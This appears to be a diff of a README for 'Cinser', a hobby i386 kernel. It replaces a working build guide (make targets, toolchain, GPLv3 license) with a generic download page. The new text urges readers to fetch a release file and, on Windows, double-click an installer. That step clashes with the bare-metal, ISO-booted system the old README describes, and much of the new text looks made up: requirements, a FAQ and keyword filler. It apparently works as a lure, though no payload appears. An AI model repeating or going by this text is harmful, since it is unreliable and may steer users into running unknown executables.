@@ -1,114 +1,101 @@
-# 🪐 Tervia Cinser — README
+# 🖥️ Cinser - Control Your Operating System Experience
 
-![License: GPL v3](https://img.shields.io/badge/License-GPLv3-blue.svg)
-![Since: 2026](https://img.shields.io/badge/Since-2026-rebeccapurple)
-![Boot: GRUB%20%2B%20Multiboot](https://img.shields.io/badge/Boot-GRUB%20%2B%20Multiboot-orange)
-![Arch: i386](https://img.shields.io/badge/Arch-i386-blue)
+Cinser is an operating system that spans i386 and x86_64. It is designed for users who value control, freedom, and understanding over abstraction.
 
-A sovereign computing environment developed by **Tervia Corporation**.  
-This page documents the **Makefile workflow** used to build, clean, and run **Tervia Cinser**.
+[![Download Cinser](https://img.shields.io/badge/Download-Cinser-blue.svg)](https://github.com/Gintoniclemon/Cinser/releases)
 
----
+## 💻 Overview
 
-## 📦 Prerequisites (Linux)
+Cinser aims to provide a straightforward experience for users interested in operating systems. Unlike conventional systems that hide complexities, Cinser empowers users by offering transparency and control over their computing environment. 
 
-Install the core toolchain:
+## 🚀 Getting Started
 
-```bash
-sudo apt update
-sudo apt install build-essential nasm grub-pc-bin xorriso qemu-system-x86 mtools
-```
+To begin, follow these simple steps to download and run Cinser:
 
-> If you use a different distro, install equivalents for: **gcc**, **binutils**, **make**, **nasm**, **grub-mkrescue**, **xorriso**, and **qemu**.
+1. **Access the Releases Page**  
+   Visit our [Releases page](https://github.com/Gintoniclemon/Cinser/releases) to find the latest version of Cinser.
 
----
+2. **Download the Appropriate File**  
+   Look for the file that matches your system architecture (i386 or x86_64). Click on the relevant file to download it to your computer.
 
-## 🧭 Project Build Layout
+3. **Install Cinser**  
+   After the download completes, locate the file in your downloads folder. Follow these steps depending on your system:
 
-After building, generated files typically go to a `build/` directory (or the directory defined by your Makefile):
+   - **For Windows:**
+     - Double-click the downloaded file to run the installer.
+     - Follow the on-screen instructions to complete the installation.
 
-```text
-build/
-├── obj/        # Object files (.o)
-├── kernel.bin  # Linked kernel binary
-└── cinser.iso  # Bootable ISO image
-```
+   - **For Linux:**
+     - Open a terminal window.
+     - Navigate to the directory where the downloaded file is located.
+     - Run the installation command provided on the Releases page.
 
-Keeping outputs separated helps avoid accidental commits and makes cleanup easy.
+## 📦 Download & Install
 
----
+Click the button below to quickly access the download page.
 
-## 🚀 Build Commands
+[![Download Cinser](https://img.shields.io/badge/Download-Cinser-blue.svg)](https://github.com/Gintoniclemon/Cinser/releases)
 
-### ✅ `make all` — Full Build
+1. Visit the [Releases page](https://github.com/Gintoniclemon/Cinser/releases).
+2. Select the version you want and download the corresponding file.
+3. Follow the installation instructions given above based on your operating system.
 
-Builds everything from source:
+## ⚙️ System Requirements
 
-- Assemble `.s` files (NASM)
-- Compile `.c` files (freestanding C)
-- Link with the project linker script
-- Create a bootable ISO (GRUB + Multiboot)
+To ensure that Cinser runs smoothly, make sure your system meets the following requirements:
 
-```bash
-make all
-```
+- **Processor:** i386 or x86_64 compatible.
+- **Memory:** Minimum of 512 MB RAM.
+- **Disk Space:** At least 1 GB of free disk space.
+- **USB Port:** Required for installation from a USB drive.
 
-**Use this when:**
-- You changed low-level boot code
-- You want a clean, consistent rebuild
-- You’re preparing a test ISO
+## 📚 Features
 
----
+Cinser offers several features designed to enhance your experience:
 
-### 🧹 `make clean` — Clean Outputs
+- **Freestanding Operating System:** No prior OS dependency.
+- **Assembly and C Support:** Allows developers to interact with low-level programming.
+- **Educational Focus:** Ideal for learning operating system concepts.
 
-Removes build artifacts (objects, kernel, ISO):
+## 🛠️ FAQs
 
-```bash
-make clean
-```
+### What is Cinser designed for?
 
-**Use this when:**
-- You changed linker scripts
-- You suspect stale objects are causing weird bugs
-- You want a completely fresh build
+Cinser is designed for users who want to understand how operating systems work at a fundamental level.
 
----
+### Can I run Cinser on older hardware?
 
-### ▶️ `make run` — Run in Emulator
+Yes, as long as your hardware meets the minimum system requirements, you should be able to run Cinser.
 
-Builds (if needed) and launches the system in an emulator (commonly QEMU):
+### Is there community support available?
 
-```bash
-make run
-```
+Yes, users can access community support via forums listed on the GitHub page. 
 
-**Use this when:**
-- You’re iterating quickly
-- You want fast boot tests
-- You’re debugging early kernel output
+## 🔗 Relevant Links
 
-> If your Makefile uses VirtualBox instead of QEMU, the target name may still be `run`—check the Makefile for the exact command.
+- [Cinser on GitHub](https://github.com/Gintoniclemon/Cinser)
+- [Releases Page](https://github.com/Gintoniclemon/Cinser/releases)
+- [Documentation](https://github.com/Gintoniclemon/Cinser/docs)
 
----
+## 📑 Topics Covered
 
-## 🧠 Tips for Debugging Builds
+Cinser covers a range of topics, including:
 
-- **If it boots yesterday but not today:** run `make clean && make all`
-- **If it crashes instantly:** ensure Multiboot header + flags are correct, and your entrypoint matches the linker script
-- **If text prints but then freezes:** confirm IDT/ISR setup before enabling anything that can fault
+- assembly
+- assembly-language
+- assembly-x86
+- bare-metal programming
+- C language integration
+- educational content
+- freestanding systems
+- GRUB bootloader
+- i386 and x86_64 architecture
+- kernel design
+- Linux compatibility
+- multiboot support
+- open-source principles
+- operating system development
+- professional systems programming
+- UNIX interfaces
 
----
-
-## 📜 License
-
-Licensed under **GNU GPLv3**.
-
-➡️ Read the full license text here: **[LICENSE](./LICENSE)**
-
----
-
-## 🌌 Final Note
-
-A kernel build system isn’t just automation — it’s part of the architecture.  
-If you can build it reliably, you can evolve it safely.
+By choosing Cinser, you gain a unique opportunity to engage directly with the core of computing. Download now and start your journey into the depths of operating systems.
